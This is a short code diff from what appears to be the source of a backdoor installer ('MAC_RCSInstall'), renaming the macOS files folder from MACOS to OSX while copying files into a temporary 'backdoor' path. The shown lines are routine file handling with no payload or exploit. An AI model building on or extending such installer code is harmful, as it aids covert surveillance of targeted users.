@@ -152,7 +152,7 @@ BOOL MAC_RCSInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct
 	CloseHandle(hfile);
 
 	// Copia i file nella directory temporanea
-	swprintf_s(tmp_path, MAX_PATH, L"%s\\MACOS\\*", rcs_info->rcs_files_path);
+	swprintf_s(tmp_path, MAX_PATH, L"%s\\OSX\\*", rcs_info->rcs_files_path);
 	hFind = FindFirstFile(tmp_path, &file_info);
 	if (hFind != INVALID_HANDLE_VALUE) {
 		do {
@@ -160,7 +160,7 @@ BOOL MAC_RCSInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct
 			if (file_info.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
 				continue;
 
-			swprintf_s(tmp_path, MAX_PATH, L"%s\\MACOS\\%s", rcs_info->rcs_files_path, file_info.cFileName);
+			swprintf_s(tmp_path, MAX_PATH, L"%s\\OSX\\%s", rcs_info->rcs_files_path, file_info.cFileName);
 			swprintf_s(tmp_path2, MAX_PATH, L"%s\\%s", temp_backdoor_path, file_info.cFileName);
 			
 			ClearAttributes(tmp_path2);
